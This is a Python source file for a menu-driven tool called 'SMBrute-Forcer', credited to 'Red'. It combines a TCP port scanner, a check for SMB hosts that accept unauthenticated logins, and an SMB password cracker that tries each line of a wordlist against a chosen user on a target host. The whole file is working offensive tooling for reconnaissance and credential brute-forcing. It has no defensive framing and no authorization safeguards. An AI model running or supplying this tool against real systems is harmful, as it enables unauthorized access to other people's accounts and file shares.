from socket import *
from colorama import Fore
import colorama
import sys
from smb.SMBConnection import SMBConnection



class SMBrute(object):
    def __init__(self,host='',user='',passwd='',port=445):
        self.host = host
        self.user = user
        self.passwd = passwd
        self.port = port
        colorama.init()

    def portScanner(self,host,port):
        setdefaulttimeout(3)
        sock = socket(AF_INET,SOCK_STREAM)

        try:
            sock.connect((host,port))
            print(Fore.GREEN + '[+] {}/TCP Open'.format(port))

        except:
            print(Fore.RED + '[-] {}/TCP Closed'.format(port))

        sock.close()
    def smbConnect(self,host):
        smb = SMBConnection(username=self.user, password=self.passwd, my_name='',
                            remote_name='', use_ntlm_v2=True, is_direct_tcp=True)

        try:
            smb.connect(host, self.port)
            print(Fore.GREEN+'\n[+] {} Authentication Disabled!'.format(host))

        except:
            print(Fore.RED+'\n[-] {} Authentication Enabled!'.format(host))


    def smbPasswdCracker(self,host,user,passwd_file,port=445):
        passwords = open(passwd_file,'r')
        for passwd in passwords.readlines():
            passwd = passwd.strip('\n')
            smb = SMBConnection(username=user, password=passwd, my_name='',
                                remote_name='', use_ntlm_v2=True, is_direct_tcp=True)
            try:
                smb.connect(host, port)
                print(Fore.GREEN + '\n[+] Found: ' +user+':'+passwd)

            except:
                print(Fore.RED + '\n[-] Not found: '+user+':'+passwd)

            smb.close()

def main():
    colorama.init()
    print(Fore.GREEN+"""
       --------------------
        | SMBrute-Forcer |
       --------------------
    ---------------------------
    [#] # Coded by Red # 
    ---------------------------
    [#] 1) Port Scanner
    [#] 2) SMB Check Auth
    [#] 3) SMB Password Cracker
    [#] 4) Exit
    ---------------------------
    [#] IG:@redsoftwareofficial
    ---------------------------
    """)
    smbrute = SMBrute()
    userData = input('>>> ')

    if userData == '1':
        hostValue = input('\n[!] Host/IP: ')

        print("""
        [#] 1) Scan a Single Port
        [#] 2) All Scan
        """)

        userValue1 = input('>>> ')

        if userValue1 == '1':
            portNumber = int(input('\n[*] Port No: '))
            smbrute.portScanner(hostValue,portNumber)

        elif userValue1 == '2':
            for i in range(1,1000):
                smbrute.portScanner(hostValue,int(i))

        else:
            pass

    elif userData == '2':

        print("""
        [#] 1) Scan a Single Host/IP
        [#] 2) Scan File
        """)
        userValue2 = input('>>> ')
        if userValue2 == '1':
            hostValue = input('\n[!] Host/IP: ')
            smbrute.smbConnect(hostValue)

        elif userValue2 == '2':
            filename = input('\n[*] File: ')
            hosts = open(filename,'r',encoding='utf-8')
            for host in hosts.readlines():
                host = host.strip('\n')
                smbrute.smbConnect(host)

        else:
            pass

    elif userData == '3':
        hostValue = input('\n[!] Host/IP: ')
        username = input('\n[!] Username: ')
        passwdname = input('\n[!] File Wordlist: ')
        smbrute.smbPasswdCracker(hostValue,username,passwdname)

    elif userData == '4':
        sys.exit(0)

    else:
        pass


if __name__ == '__main__':
   main()


